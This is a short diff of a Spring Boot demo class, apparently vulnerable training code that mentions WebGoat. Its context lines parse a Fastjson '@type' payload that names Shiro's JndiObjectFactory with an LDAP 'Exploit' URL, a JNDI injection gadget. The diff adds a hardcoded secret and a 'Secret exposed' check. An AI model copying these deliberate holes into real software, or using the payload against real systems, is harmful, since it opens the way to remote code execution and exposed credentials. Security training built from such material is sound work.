@@ -15,6 +15,8 @@ import org.springframework.web.bind.annotation.RestController;
 @SpringBootApplication
 public class DemoApplication {
 
+	String secretValue = "secr37Value";
+
 	private static final Logger logger = LogManager.getLogger();
 
 	@RequestMapping(value = "/helloTomcat")
@@ -31,6 +33,12 @@ public class DemoApplication {
 		String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
 		JSON jsonObject = JSON.parseObject(payload);
 		logger.info(jsonObject.toString());
+
+		if (secretValue.equals("test")) {
+			System.out.println("Secret exposed");
+			// lesson-template.sample-attack.success is defined in
+			// src/main/resources/i18n/WebGoatLabels.properties
+		}
 
 		SpringApplication.run(DemoApplication.class, args);
 
